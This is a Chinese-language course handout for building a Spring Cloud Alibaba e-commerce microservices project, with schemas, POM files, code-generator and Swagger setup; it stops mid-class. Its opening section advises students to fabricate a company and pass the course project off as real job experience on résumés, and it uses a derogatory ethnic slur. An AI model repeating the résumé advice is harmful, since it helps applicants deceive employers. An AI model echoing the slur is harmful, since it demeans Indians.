

**重点：加 二当家小D 讲师微信： xdclass6**

有专属技术交流群，有问题直接留言给我即可，扫描下面二维码也可以



![支付成功弹窗-二当家](https://file.xdclass.net/note/2021/%E5%90%8E%E7%AB%AF%E6%8F%90%E6%95%88%E7%A5%9E%E5%99%A8/img/%E6%94%AF%E4%BB%98%E6%88%90%E5%8A%9F%E5%BC%B9%E7%AA%97-%E4%BA%8C%E5%BD%93%E5%AE%B6.png)



![u=4073844855,1130410908&fm=26&gp=0](https://file.xdclass.net/note/2020/%E6%96%B0%E7%89%88ssm/%E5%9B%BE%E7%89%87/u=4073844855,1130410908&fm=26&gp=0.png)





### 第一章 最强综合项目大课介绍和学后水平

####第1集  微服务项目大课训练营介绍+学后水平

![image-20210325140659593](img/image-20210325140659593.png)

![image-20210325140719644](img/image-20210325140719644.png)

![image-20210325140744249](img/image-20210325140744249.png)

![image-20210325140807287](img/image-20210325140807287.png)

#### 第2集 说了那么多，接下来你应该准备什么？

![image-20210325140828341](img/image-20210325140828341.png)

![image-20210325140842767](img/image-20210325140842767.png)

![image-20210325140909175](img/image-20210325140909175.png)



#### 第3集 微服务项目大课目标设定

![image-20210325140934298](img/image-20210325140934298.png)



### 第二章 架构方法论+DevOps+领域驱动设计

#### 第1集 解决方案分析方法论SWOT

![image-20210325141002546](img/image-20210325141002546.png)

#### 第2集 关于很多人说的DDD领域驱动设计

![image-20210325141019568](img/image-20210325141019568.png)

#### 第3集 一个P7技术管理者的面试题

![image-20210325141044140](img/image-20210325141044140.png)

![image-20210325141105947](img/image-20210325141105947.png)

![image-20210325141133661](img/image-20210325141133661.png)



#### 第4集 和你说下DevOps是如何提效的

![image-20210325141153732](img/image-20210325141153732.png)











![logo](https://file.xdclass.net/note/2020/%E6%96%B0%E7%89%88ssm/logo.png) **愿景："让编程不再难学，让技术与生活更加有趣"** 


### 第三章 1024电商平台系统实战架构设计和实现需求分析



#### 第1集  1024电商平台业务背景介绍和简历项目编写建议

**简介：讲解电商营销中心的业务背景和简历项目编写建议**

* 大课业务背景

```
实际上这个大课项目，是我在海外业务线的一个拉新营销平台的基础模型，印度印尼市场，俗称双印，可以说是V1版本，整个过程0~1也是非常艰辛，流量峰值差异大(夜间、节日等)、产品变动、薅羊毛攻击、各种国家政策等，目前由于印度阿三那边冲突XXX，在20年下半年暂时下线了。

大家编写简历的时候，自己可以编造一个公司自营商城/金融/在线教育等，为什么这样说呢，因为项目模型是通用的，不是局限某个领域，个人推荐是电商或者在线教育，需要考虑怎么在简历上编写

日活跃用户：30~50万，实际500万~1000万用户

如果有条件，可以说公司是海外业务的，这个面试官比较难考查、且项目问题亮点也是比较多的，也是目前国内都会遇到的

这个属于B2C模式，
在线教育B2C：平台自产视频，商家对消费者：比如小滴课堂，vipkid少儿培训
电商平台B2C：平台自有商品，小米有品、网易严选等
```





* 商业模式介绍（面试官可能会问）

```
科普下：B2C、B2B、C2C、O2O， B表企业，C代表个人（或者说终端消费用户），O代表线上，也可以代表线下。

最通俗易懂的解释

B2C：Business To Consumer 企业和个人之间的交易，好比天猫超市、考拉海购、京东超市、小米有品，属于B2C模式
B2B：Business To Business 企业和企业之间的交易，比如阿里巴巴1688，产品供应链的上下游
C2C：Consumer To Consumer 个人和个人之见的交易，闲鱼卖二手、58同城交易、朋友圈个人微商
O2O：Online To Offline 线上购买线下体验，比如美团上领取优惠券，到店消费
```



* 需求分析和规划
  * 用户服务
    * 用户注册/登录
    * 头像和信息维护
    * 收货地址模块
  * 优惠券服务
    * 展示和领劵
    * 使用和释放
  * 商品服务
    * 商品基本展示
    * 库存扣减回收
    * 购物车模块
  * 订单服务
    * 下单支付
    * 订单基本操作

* 重点强调

  * 一个个微服务创建，不用心急，一定要提炼好项目模型，一步步来操作

  * 整个大课有简单逻辑、有复杂逻辑，看不懂的可以看多几遍

    



















#### 第2集 小滴课堂1024电商平台业务架构介绍

**简介：1024电商平台业务架构**

* 业务整体架构图



![小滴课堂-工业级中台电商架构图](img/小滴课堂-工业级中台电商架构图.png)

* 各个大模块功能介绍（有个大体认知就行）

* 项目规模和人员配比（高级工程师或者TeamLeader面试会问到，为什么这样搭配？）

  * 公司规模800人左右，技术人员占比300人，这边业务线研发人员50人左右,  研发人员是业务线划分

  * 研发人员: 50人（总负责人高级技术专家, 阿里P8或者资深P7+）

    * 前端10人

      * 负责C端界面研发、管理后端研发
      * 部分具备全栈功能

    * 后端20人

      * 多个微服务开发和工程搭建
      * 每个微服务都有2个主负责人，1人手上会有2~3个项目
      * 5~10人有一个小组组长(P7)

    * 运维3人

      * 负责K8S和Rancher平台微服务、中间件搭建、监控处理、IaaS资源管理

    * 测试5人:

    * app端开发 12人（Flutter技术栈）

      

  * 开发周期：1到2年，不断迭代

    * 初版1~2个月，接下去是每个周一个版本

  * 这个就说到了一个，如何定义一个完整的项目，任何企业的产品都是不断迭代，功能增加删除

  

* 如果要完成这些全部也不难，可以关注我们小滴课堂，专题技术+大课训练营 就可以开发完成这些了
  * 学时也超过半年，所以学完估计也是1~2年了
  * 这个层级的TeamLeader人员是阿里P8高级技术专家
  * 来个互联网一线薪酬（图片来源网上，基本符合 ，课程结尾会详细介绍各层级要求）

![img](img/9f7e214caefd9f0a10945772d94735e5.png)























#### 第3集 1024电商平台数据库划分+用户相关表介绍

**简介：讲解电商营销中心数据库划分和用户表介绍**

* 换个熟悉的方式，大家可以看懂我们要做的模块和流程

  * 前后端分离架构，容器编排部署

  ![image-20210124103445969](img/image-20210124103445969.png)

  

* 各个微服务独立数据库，到搭建每个微服务的时候再介绍

  * 用户服务数据库 xdclass_user
  * 商品服务数据库 xdclass_product
  * 优惠券服务数据库 xdclass_coupon
  * 订单服务数据库 xdclass_order

* 用户服务数据库 (其他用到再增加)

  * 用户表

  ```
  CREATE TABLE `user` (
    `id` bigint(11) unsigned NOT NULL AUTO_INCREMENT,
    `name` varchar(128) DEFAULT NULL COMMENT '昵称',
    `pwd` varchar(124) DEFAULT NULL COMMENT '密码',
    `head_img` varchar(524) DEFAULT NULL COMMENT '头像',
    `slogan` varchar(524) DEFAULT NULL COMMENT '用户签名',
    `sex` tinyint(2) DEFAULT '1' COMMENT '0表示女，1表示男',
    `points` int(10) DEFAULT '0' COMMENT '积分',
    `create_time` datetime DEFAULT NULL,
    `mail` varchar(64) DEFAULT NULL COMMENT '邮箱',
    `secret` varchar(12) DEFAULT NULL COMMENT '盐，用于个人敏感信息处理',
    PRIMARY KEY (`id`),
    UNIQUE KEY `mail_idx` (`mail`)
  ) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;
  ```

  

  * 收货地址表

  ```
  CREATE TABLE `address` (
    `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
    `user_id` bigint(20) DEFAULT NULL COMMENT '用户id',
    `default_status` int(1) DEFAULT NULL COMMENT '是否默认收货地址：0->否；1->是',
    `receive_name` varchar(64) DEFAULT NULL COMMENT '收发货人姓名',
    `phone` varchar(64) DEFAULT NULL COMMENT '收货人电话',
    `province` varchar(64) DEFAULT NULL COMMENT '省/直辖市',
    `city` varchar(64) DEFAULT NULL COMMENT '市',
    `region` varchar(64) DEFAULT NULL COMMENT '区',
    `detail_address` varchar(200) DEFAULT NULL COMMENT '详细地址',
    `create_time` datetime DEFAULT NULL,
    PRIMARY KEY (`id`)
  ) ENGINE=InnoDB AUTO_INCREMENT=39 DEFAULT CHARSET=utf8mb4 COMMENT='电商-公司收发货地址表';
  ```

  

























**<img src="./img/logo.png" alt="logo" style="zoom: 50%;" />   愿景："让编程不再难学，让技术与生活更加有趣"**


### 第四章 1024电商平台项目技术选择和创建聚合工程项目



#### 第1集 为什么选择SpringCloudAlibaba作为技术和版本说明

**简介：微服务技术对比和选择，版本说明**

* SpringCloud

```
全家桶+轻松嵌入第三方组件(Netflix 奈飞)
官网：https://spring.io/projects/spring-cloud
配套
通信方式：http restful
注册中心：eureka
配置中心：config
断路器：hystrix
网关：zuul/gateway
分布式追踪系统：sleuth+zipkin
```

* Spring  Cloud Alibaba

```
全家桶+阿里生态多个组件组合+SpringCloud支持

官网 https://spring.io/projects/spring-cloud-alibaba

配套

通信方式：http restful
服务注册发现：Nacos
服务限流降级：Sentinel
分布配置中心：Nacos
服务网关：SpringCloud Gateway
服务之间调用：Feign、Ribbon
链路追踪：Sleuth+Zipkin
```


* 为什么要选择SpringCloud和AlibabaCloud的区别

```
官网 https://spring.io/projects/spring-cloud-alibaba#overview
 
SpringCloud和AlibabaCloud组件存在很大交集，互相配合

SpringCloud很多组件是基于第三方整合，目前多个已经不更新了，比如zuul、eureka、hystrix等

AlibabaCloud 提供一站式微服务解决方法，已经和SpringCloud进行了整合，组件互相支持

我们也习惯称为 Spring Cloud Alibaba

详细介绍：https://mp.weixin.qq.com/s/NMD52MLDY2Lq3LSeOcVwjA

```

* 版本说明（21年全新，未来会升级，如果期间有三方难以解决的bug或者漏洞再更换版本）

  * SpringBoot  2.3.3.RELEASE 版本

  * Spring Cloud Hoxton.SR8 版本 

    * 有另外一个 Spring Cloud 2020 版本搭配SpringBoot2.4以上
    * 刚发布，有不少坑，一般都不会用最新版本

  * AlibabaCloud 2.2.1.RELEASE 版本

    

    






















#### 第2集 Maven聚合工程创建微服务项目实战

**简介：使用Maven聚合工程创建微服务架构**

* maven聚合工程
	* xdclass-common
	* xdclass-product-service
	* xdclass-user-service
	* xdclass-order-service
	* xdclass-coupon-service
	* xdclass-gateway


* 创建项目（记得删除聚合工程src目录）

* 添加依赖

```
   <modelVersion>4.0.0</modelVersion>

    <groupId>net.xdclass</groupId>
    <artifactId>xdclass-1024-shop</artifactId>
    <version>1.0-SNAPSHOT</version>
    <modules>
        <module>xdclass-common</module>
        <module>xdclass-product-service</module>
        <module>xdclass-user-service</module>
        <module>xdclass-order-service</module>
        <module>xdclass-coupon-service</module>
        <module>xdclass-gateway</module>
    </modules>


    <!-- 一般来说父级项目的packaging都为pom，packaging默认类型jar类型-->
    <packaging>pom</packaging>


    <properties>

        <java.version>11</java.version>
        <maven.compiler.source>11</maven.compiler.source>
        <maven.compiler.target>11</maven.compiler.target>
        <spring.boot.version>2.3.3.RELEASE</spring.boot.version>
        <spring.cloud.version>Hoxton.SR8</spring.cloud.version>
        <alibaba.cloud.version>2.2.1.RELEASE</alibaba.cloud.version>
        <mybatisplus.boot.starter.version>3.4.0</mybatisplus.boot.starter.version>
        <lombok.version>1.18.16</lombok.version>
        <commons.lang3.version>3.9</commons.lang3.version>
        <commons.codec.version>1.15</commons.codec.version>
        <springfox.boot.starter.version>3.0.0</springfox.boot.starter.version>
        <docker.image.prefix>xdclass-cloud</docker.image.prefix>

        <!--跳过单元测试-->
        <skipTests>true</skipTests>

    </properties>



    <!--锁定版本-->
    <dependencyManagement>
        <dependencies>
            <!--https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-dependencies/2.3.3.RELEASE-->
            <dependency>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-dependencies</artifactId>
                <version>${spring.boot.version}</version>
                <type>pom</type>
                <scope>import</scope>
            </dependency>

            <!--https://mvnrepository.com/artifact/org.springframework.cloud/spring-cloud-dependencies/Hoxton.SR8-->
            <dependency>
                <groupId>org.springframework.cloud</groupId>
                <artifactId>spring-cloud-dependencies</artifactId>
                <version>${spring.cloud.version}</version>
                <type>pom</type>
                <scope>import</scope>
            </dependency>

            <!--https://mvnrepository.com/artifact/com.alibaba.cloud/spring-cloud-alibaba-dependencies/2.2.1.RELEASE-->
            <dependency>
                <groupId>com.alibaba.cloud</groupId>
                <artifactId>spring-cloud-alibaba-dependencies</artifactId>
                <version>${alibaba.cloud.version}</version>
                <type>pom</type>
                <scope>import</scope>
            </dependency>



            <!--mybatis plus和springboot整合-->
            <dependency>
                <groupId>com.baomidou</groupId>
                <artifactId>mybatis-plus-boot-starter</artifactId>
                <version>${mybatisplus.boot.starter.version}</version>
            </dependency>

            <!--https://mvnrepository.com/artifact/org.projectlombok/lombok/1.18.16-->
            <!--scope=provided，说明它只在编译阶段生效，不需要打入包中, Lombok在编译期将带Lombok注解的Java文件正确编译为完整的Class文件-->
            <dependency>
                <groupId>org.projectlombok</groupId>
                <artifactId>lombok</artifactId>
                <version>${lombok.version}</version>
                <scope>provided</scope>
            </dependency>



            <!-- https://mvnrepository.com/artifact/org.apache.commons/commons-lang3 -->
            <dependency>
                <groupId>org.apache.commons</groupId>
                <artifactId>commons-lang3</artifactId>
                <version>${commons.lang3.version}</version>
            </dependency>

            <!-- https://mvnrepository.com/artifact/commons-codec/commons-codec -->
            <!--用于加密-->
            <dependency>
                <groupId>commons-codec</groupId>
                <artifactId>commons-codec</artifactId>
                <version>${commons.codec.version}</version>
            </dependency>



            <!--接口文档依赖-->
            <dependency>
                <groupId>io.springfox</groupId>
                <artifactId>springfox-boot-starter</artifactId>
                <version>${springfox.boot.starter.version}</version>
            </dependency>



        </dependencies>
    </dependencyManagement>

    <!-- 代码库 -->
    <repositories>
        <repository>
            <id>maven-ali</id>
            <url>http://maven.aliyun.com/nexus/content/groups/public//</url>
            <releases>
                <enabled>true</enabled>
            </releases>
            <snapshots>
                <enabled>true</enabled>
                <updatePolicy>always</updatePolicy>
                <checksumPolicy>fail</checksumPolicy>
            </snapshots>
        </repository>
    </repositories>


    <pluginRepositories>
        <pluginRepository>
            <id>public</id>
            <name>aliyun nexus</name>
            <url>http://maven.aliyun.com/nexus/content/groups/public/</url>
            <releases>
                <enabled>true</enabled>
            </releases>
            <snapshots>
                <enabled>false</enabled>
            </snapshots>
        </pluginRepository>
    </pluginRepositories>

    <!--module不用添加打包版本信息-->
    <build>
        <plugins>
            <plugin>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-maven-plugin</artifactId>
                <version>${spring.boot.version}</version>
                <configuration>
                    <fork>true</fork>
                    <addResources>true</addResources>
                </configuration>
            </plugin>
        </plugins>
    </build>

```




* 注意: 有些包maven下载慢，等待下载如果失败

	* 删除本地仓库spring相关的包，重新执行 mvn install
	* 建议先使用默认的maven仓库，不用更换地址



![image-20201118181326022](img/image-20201118181326022.png)

​	















#### 第3集 开源中国Git仓库-介绍和项目纳入版本管理

**简介：gitee介绍和git配置**

* Git介绍 
  * 是一个版本管理工具, 其作用就是可以让你更好的管理你的程序，比如你原来提交过的内容，以后虽然修改了，但是通过git这个工具，可以把你原来提交的内容重现出来，这样对于你后来才意识到的一些错误的更改，可以进行还原
* 基于git协议的代码仓库
  * github 全球最大同性交友社区
  * gitee  开源中国
  * gitlab 开源的git仓库平台，阿里等大厂就是基于这个搭建
  * codeup 阿里云上的免费git仓库

* gitee仓库地址
  * https://gitee.com/

* 大课项目必须用git吗？
  * 如果是因为不会git，而不用则不行，因为这个是互联网公司必备的
  * 可以看联系客服看小滴课堂 git+gitlab专题视频
* 本地安装文档
  * https://www.runoob.com/git/git-install-setup.html
  * https://git-scm.com/book/zh/v2/%E8%B5%B7%E6%AD%A5-%E5%AE%89%E8%A3%85-Git

* 大课项目加入git管理（是公钥设置，不是秘钥设置，视频有口误）
  * 本地生成公钥 ssh-keygen -t rsa -C "794666918@qq.com"
    * 生成公钥文档：https://gitee.com/help/articles/4181
    * 设置公钥文档：https://gitee.com/help/articles/4191#article-header0
  * 进入项目目录

![image-20210125194546081](img/image-20210125194546081.png)

![image-20210125194639188](img/image-20210125194639188.png)























**<img src="./img/logo.png" alt="logo" style="zoom: 50%;" />   愿景："让编程不再难学，让技术与生活更加有趣"**

### 第五章 写代码飞的感觉，巩固下这几个提效利器



#### 第1集 POJO类的提效利器Lombok插件

**简介：讲解lombok的介绍和安装**

* 提效插件：Lombok、MybaitsPlus、SwaggerUI
  
  * 这里只做快速回顾，如果不熟悉的，联系我们客服看相关专题课程，参加大课训练营的都可以5折购买
  
  
  
* 什么lombok
  
  * 一个优秀的Java代码库，简化了Java的编码，为Java代码的精简提供了一种方式
  * 你是否发现每个JavaBean都会写getter，setter，equals，hashCode和toString的模板代码，特别的多于没技术
* lombok消除Java的冗长代码，尤其是对于简单的Java对象，只要加上注解就行
  
* 使用方式

  * 顶层parent项目添加依赖进行版本管理 ( 创建项目的时候已经添加 )

  ```
  <dependency>
            <groupId>org.projectlombok</groupId>
            <artifactId>lombok</artifactId>
  			    <version>1.18.16</version>
            <scope>provided</scope>
  </dependency>
  ```
  
  * 需要的module项目里面再引入
* 添加IDE工具对Lombok的支持
  
    * 点击File-- Settings设置界面，安装Lombok插件，然后重启idea

![image-20201118192214435](img/image-20201118192214435.png)



















#### 第2集 Lombok插件常见注解实战和项目引入通用jar

**简介：讲解lombok的常见注解实战**

* xdclass-user-service进行测试

  * common项目添加
    * 后续各个项目都依赖的包，可以统一在common项目里面添加管理，

  ```
  <dependency>
             <groupId>org.projectlombok</groupId>
             <artifactId>lombok</artifactId>
  </dependency>
  
  <!--项目中添加 spring-boot-starter-->
  <dependency>
              <groupId>org.springframework.boot</groupId>
              <artifactId>spring-boot-starter-web</artifactId>
  </dependency>
  ```

  * user-service项目引入common项目

  ```
  <dependency>
       <groupId>net.xdclass</groupId>
       <artifactId>xdclass-common</artifactId>
       <version>1.0-SNAPSHOT</version>
  </dependency>
  ```

  * 聚合工程的pom文件 修改Lombok的作用域范围

  ```
  
  <!--https://mvnrepository.com/artifact/org.projectlombok/lombok/1.18.16-->
  <!--scope=provided，说明它只在编译阶段生效，不需要打入包中, Lombok在编译期将带Lombok注解的Java文件正确编译为完整的Class文件-->
  <dependency>
     <groupId>org.projectlombok</groupId>
     <artifactId>lombok</artifactId>
     <version>${lombok.version}</version>
     <!--<scope>provided</scope>-->
  </dependency>
  ```

  

  

* 常见注解

  * @Getter/@Setter

    * 作用类上，生成所有成员变量的getter/setter方法
    * 作用于成员变量上，生成该成员变量的getter/setter方法

  * @ToString

    * 作用于类，覆盖默认的toString()方法

    

  * @EqualsAndHashCode

    * 作用于类，覆盖默认的equals和hashCode

  * @NoArgsConstructor

    * 生成无参构造器

    

  * @AllArgsConstructor

    * 生成全参构造器

  * @Data

    * 作用于类上，是以下注解的集合
      *  @ToString 
      * @EqualsAndHashCode 
      * @Getter 
      * @Setter 
      * @RequiredArgsConstructor

  * @Log / @Slf4j  

    * 作用于类上，生成日志变量, 用于记录日志, 已经在web项目中添加log依赖

    * 如果不生效，记得检查下面的配置，另外重新更新下lombok插件，重启idea

![image-20201118205358450](img/image-20201118205358450.png)



















#### 第3集 增强版ORM框架-Mybatis plus介绍

**简介：增强版ORM框架 mybatis plus介绍**

* 背景
  * 写一个数据库表的crud接口，编写实体类-》编写Controller-》编写Service-》编写DAO-》-》编写XML文件
  * 特别是管理后台，多数都是简单的CRUD，用普通的mybatis有的鸡肋

* 介绍
  * 官网  https://baomidou.com/
  * 是一个 Mybatis 的增强工具，在 Mybatis 的基础上只做增强不做改变，为简化开发、提高效率而生
  * 是怎么增强的呢？已经封装好了一些crud方法，我们不需要再写xml了，直接调用这些方法就行，类似JPA但优于JPA

* SpringBoot整合

  * 添加依赖(common项目里面添加，user-service项目里面测试)

  ```
    		<dependency>
             <groupId>mysql</groupId>
             <artifactId>mysql-connector-java</artifactId>
         </dependency>
  
         <dependency>
             <groupId>com.baomidou</groupId>
             <artifactId>mybatis-plus-boot-starter</artifactId>
         </dependency>
  ```

  

















**<img src="./img/logo.png" alt="logo" style="zoom: 50%;" />   愿景："让编程不再难学，让技术与生活更加有趣"**

### 第六章  数据库逆向工程整合SpringCloud Alibaba+编码分层规范



#### 第1集 项目引入Mybatis-plus-generator代码自动生成工具

**简介：介绍Mybatis-plus-generator代码自动化生成工具**

* 介绍
  * 底层是模板引擎技术，可以自定义生成的java类模板
* 基础版mybatis-genarator
* 进阶版mybatis-plus-genarator

* 添加依赖
  * 统一Common项目添加，各个项目测试类里面配置

```
    <!-- 代码自动生成依赖 begin -->
        <dependency>
            <groupId>com.baomidou</groupId>
            <artifactId>mybatis-plus-generator</artifactId>
            <version>3.4.1</version>
        </dependency>
        <!-- velocity -->
        <dependency>
            <groupId>org.apache.velocity</groupId>
            <artifactId>velocity-engine-core</artifactId>
            <version>2.0</version>
        </dependency>
        <!-- 代码自动生成依赖 end-->
```

* 代码（标记TODO的记得修改）

```
public class MyBatisPlusGenerator {

    public static void main(String[] args) {
        //1. 全局配置
        GlobalConfig config = new GlobalConfig();
        // 是否支持AR模式
        config.setActiveRecord(true)
                // 作者
                .setAuthor("二当家小D")
                // 生成路径，最好使用绝对路径，window路径是不一样的
                //TODO  TODO  TODO  TODO
                .setOutputDir("/Users/xdclass/Desktop/demo/src/main/java")
                // 文件覆盖
                .setFileOverride(true)
                // 主键策略
                .setIdType(IdType.AUTO)

                .setDateType(DateType.ONLY_DATE)
                // 设置生成的service接口的名字的首字母是否为I，默认Service是以I开头的
                .setServiceName("%sService")

                //实体类结尾名称
                .setEntityName("%sDO")

                //生成基本的resultMap
                .setBaseResultMap(true)

                //不使用AR模式
                .setActiveRecord(false)

                //生成基本的SQL片段
                .setBaseColumnList(true);

        //2. 数据源配置
        DataSourceConfig dsConfig = new DataSourceConfig();
        // 设置数据库类型
        dsConfig.setDbType(DbType.MYSQL)
                .setDriverName("com.mysql.cj.jdbc.Driver")
                //TODO  TODO  TODO  TODO
                .setUrl("jdbc:mysql://127.0.0.1:3306/xdclass_user?useSSL=false")
                .setUsername("root")
                .setPassword("xdclass.net");

        //3. 策略配置globalConfiguration中
        StrategyConfig stConfig = new StrategyConfig();

        //全局大写命名
        stConfig.setCapitalMode(true)
                // 数据库表映射到实体的命名策略
                .setNaming(NamingStrategy.underline_to_camel)

                //使用lombok
                .setEntityLombokModel(true)

                //使用restcontroller注解
                .setRestControllerStyle(true)

                // 生成的表, 支持多表一起生成，以数组形式填写
                //TODO  TODO  TODO  TODO
                .setInclude("user","address");

        //4. 包名策略配置
        PackageConfig pkConfig = new PackageConfig();
        pkConfig.setParent("net.xdclass")
                .setMapper("mapper")
                .setService("service")
                .setController("controller")
                .setEntity("model")
                .setXml("mapper");

        //5. 整合配置
        AutoGenerator ag = new AutoGenerator();
        ag.setGlobalConfig(config)
                .setDataSource(dsConfig)
                .setStrategy(stConfig)
                .setPackageInfo(pkConfig);

        //6. 执行操作
        ag.execute();
        System.out.println("======= 小滴课堂 Done 相关代码生成完毕  ========");
    }
}
```

* 导入生成好的代码
  * model (为啥不放common项目，如果是确定每个服务都用到的依赖或者类才放到common项目)
  * mapper 类接口拷贝
  * resource/mapper文件夹 xml脚本拷贝
  * controller
  * service 不拷贝

























#### 第2集  项目编码规范介绍-专用名词和POJO实体类约定

**简介：项目编码规范介绍和POJO实体类约定**

* 注意
  * 使用起来和普通版的mybatis generator一样，但是这个纯代码，不用复杂xml配置
  * 任何框架，不要使用过多的侵入或者框架定制化深的内容，防止后续改动耦合性高，成本大
* N方库说明

```
一方库: 本工程内部子项目模块依赖的库(jar 包)。
二方库: 公司内部发布到中央仓库，可供公司内部其它应用依赖的库(jar包)。
三方库: 公司之外的开源库(jar 包)。
```



* POJO实体类

```
POJO(Plain Ordinary Java Object): 在手册中，POJO 专指只有 setter / getter / toString的简单类，包括DO/DTO/BO/VO等, 禁止命名成xxxPOJO
```



* 各个层级约束规范

```
A) Service/DAO层方法命名规约
	1) 获取单个对象的方法用get做前缀。
	2) 获取多个对象的方法用list做前缀，复数形式结尾如:listObjects。 
	3) 获取统计值的方法用count做前缀。
	4) 插入的方法用save/insert做前缀。
	5) 删除的方法用remove/delete做前缀。
	6) 修改的方法用update做前缀。

B) 领域模型命名规约
  1) 数据对象:xxxDO，xxx即为数据表名。
  2) 一般数据传输对象:xxxDTO，xxx为业务领域相关的名称，项目里面也用VO。 
  3) 展示对象:xxxVO，也就是响应给前端的实体包装类。
  4) 接收前端json对象请求的命名为 XXXRequest
```



* 更多开发规范，可以参考阿里巴巴编码手册（资料里面有）
  * 有兴趣的同学也可以安装IDEA编码扫描插件，不过前期可以先不用开启，会影响电脑卡顿和强迫症







































**<img src="./img/logo.png" alt="logo" style="zoom: 50%;" />   愿景："让编程不再难学，让技术与生活更加有趣"**

### 第七章 用户微服务基础模块开发+工具类封装+SwaggerUI3.0整合



#### 第1集 用户微服务项目开发之收货地址查询接口开发

**简介：用户微服务数据库配置和查询个人收货地址接口**

* 配置文件配置 application.yml

```
server:
  port: 9001

spring:
  application:
    name: xdclass-user-service

#数据库配置
  datasource:
    driver-class-name: com.mysql.cj.jdbc.Driver
    url: jdbc:mysql://127.0.0.1:3306/xdclass_user?useUnicode=true&characterEncoding=utf-8&useSSL=false&serverTimezone=Asia/Shanghai
    username: root
    password: xdclass.net
    
#配置plus打印sql日志
mybatis-plus:
  configuration:
    log-impl: org.apache.ibatis.logging.stdout.StdOutImpl


#设置日志级别,ERROR/WARN/INFO/DEBUG,默认是INFO以上才显示
logging:
  level:
    root: INFO
```

* springboot启动类注解

```
@SpringBootApplication
@MapperScan("net.xdclass.mapper")
```



* 查询地址详情接口（目的：测试连接数据库）































#### 第2集 微服务项目整合SwaggerUI3.0生成文档

**简介：微服务整合SwaggerUI3.0接口文档**

* Postman配置多环境操作
  * 方便未来切换环境
    * 开发
    * 测试
    * 预发布
    * 线上
  * ![image-20210126135150724](img/image-20210126135150724.png)
* common项目 新增SwaggerUI3.0依赖，parent项目已经声明了版本

```
       <!--swagger ui接口文档依赖-->
       <dependency>
           <groupId>io.springfox</groupId>
           <artifactId>springfox-boot-starter</artifactId>
       </dependency>
```

* SwaggerConfiguration配置类开发

```
@Component
@EnableOpenApi
@Data
public class SwaggerConfiguration {


    @Bean
    public Docket webApiDoc(){


        return new Docket(DocumentationType.OAS_30)
                .groupName("用户端接口文档")
                .pathMapping("/")
                // 定义是否开启swagger，false为关闭，可以通过变量控制，线上关闭
                .enable(true)
                //配置api文档元信息
                .apiInfo(apiInfo())
                // 选择哪些接口作为swagger的doc发布
                .select()
                .apis(RequestHandlerSelectors.basePackage("net.xdclass"))
                //正则匹配请求路径，并分配至当前分组
                .paths(PathSelectors.ant("/api/**"))
                .build();
    }



    private ApiInfo apiInfo() {
        return new ApiInfoBuilder()
                .title("1024电商平台")
                .description("微服务接口文档")
                .contact(new Contact("小滴课堂-二当家小D", "https://xdclass.net", "794666918@qq.com"))
                .version("12")
                .build();
    }
```

* AddressController配置接口文档
  * 访问地址 http://localhost:9001/swagger-ui/index.html#/



















#### 第3集 微服务项目整合SwaggerUI3.0接口文档分组和Header头定义

**简介：SwaggerUI3.0接口文档分组和Header头定义**

* 接口文档分组，用户端、管理后台

```
    @Bean
    public Docket adminApiDoc(){
        return new Docket(DocumentationType.OAS_30)
                .groupName("管理端接口文档")
                .pathMapping("/")
                // 定义是否开启swagger，false为关闭，可以通过变量控制，线上关闭
                .enable(true)
                //配置api文档元信息
                .apiInfo(apiInfo())
                // 选择哪些接口作为swagger的doc发布
                .select()
                .apis(RequestHandlerSelectors.basePackage("net.xdclass"))
                //正则匹配请求路径，并分配至当前分组
                .paths(PathSelectors.ant("/admin/**"))

                .build();
    }


```

* 请求需要自定义http头，比如登录token令牌

```
    @Bean
    public Docket webApiDoc(){


        return new Docket(DocumentationType.OAS_30)
                .groupName("用户端接口文档")
                .pathMapping("/")
                // 定义是否开启swagger，false为关闭，可以通过变量控制，线上关闭
                .enable(true)
                //配置api文档元信息
                .apiInfo(apiInfo())
                // 选择哪些接口作为swagger的doc发布
                .select()
                .apis(RequestHandlerSelectors.basePackage("net.xdclass"))
                //正则匹配请求路径，并分配至当前分组
                .paths(PathSelectors.ant("/api/**"))
                //正则匹配请求路径，并分配至当前分组，当前所有接口
                .paths(PathSelectors.any())

                .build()

                //新版swagger3.0配置
                .globalRequestParameters(getGlobalRequestParameters())
                .globalResponses(HttpMethod.GET, getGlobalResponseMessage())
                .globalResponses(HttpMethod.POST, getGlobalResponseMessage());

    }
    
   
   /**
     * 生成全局通用参数, 支持配置多个响应参数
     * @return
     */
    private List<RequestParameter> getGlobalRequestParameters() {
        List<RequestParameter> parameters = new ArrayList<>();
        parameters.add(new RequestParameterBuilder()
                .name("token")
                .description("登录令牌")
                .in(ParameterType.HEADER)
                .query(q -> q.model(m -> m.scalarModel(ScalarType.STRING)))
                .required(false)
                .build());

//        parameters.add(new RequestParameterBuilder()
//                .name("version")
//                .description("版本号")
//                .required(true)
//                .in(ParameterType.HEADER)
//                .query(q -> q.model(m -> m.scalarModel(ScalarType.STRING)))
//                .required(false)
//                .build());
        return parameters;
    }

    /**
     * 生成通用响应信息
     * @return
     */
    private List<Response> getGlobalResponseMessage() {
        List<Response> responseList = new ArrayList<>();
        responseList.add(new ResponseBuilder().code("4xx").description("请求错误，根据code和msg检查").build());
        return responseList;
    }
}
```























#### 第4集 统一接口响应协议-响应工具类封装

**简介：统一接口响应协议和响应工具类封装**

* 统一业务状态码 BizCodeEnum开发
  * 状态码定义约束，共6位数，前三位代表服务，后3位代表接口
  * 比如 商品服务210,购物车是220、用户服务230，403代表权限

```
/**
 * 小滴课堂,愿景：让技术不再难学
 *
 * @Description 状态码定义约束，共6位数，前三位代表服务，后4位代表接口
 *  比如 商品服务210,购物车是220、用户服务230，403代表权限
 *
 **/
public enum  BizCodeEnum {


    /**
     * 通用操作码
     */
    OPS_REPEAT(110001,"重复操作"),

  	/**
     *验证码
     */
    CODE_TO_ERROR(240001,"接收号码不合规"),
    CODE_LIMITED(240002,"验证码发送过快"),
    CODE_ERROR(240003,"验证码错误"),
    CODE_CAPTCHA(240101,"图形验证码错误"),

    /**
     * 账号
     */
    ACCOUNT_REPEAT(250001,"账号已经存在"),
    ACCOUNT_UNREGISTER(250002,"账号不存在"),
    ACCOUNT_PWD_ERROR(250003,"账号或者密码错误");
}
```



* 接口统一协议 JsonData工具类开发

```
@Data
@AllArgsConstructor
@NoArgsConstructor
public class JsonData {

    /**
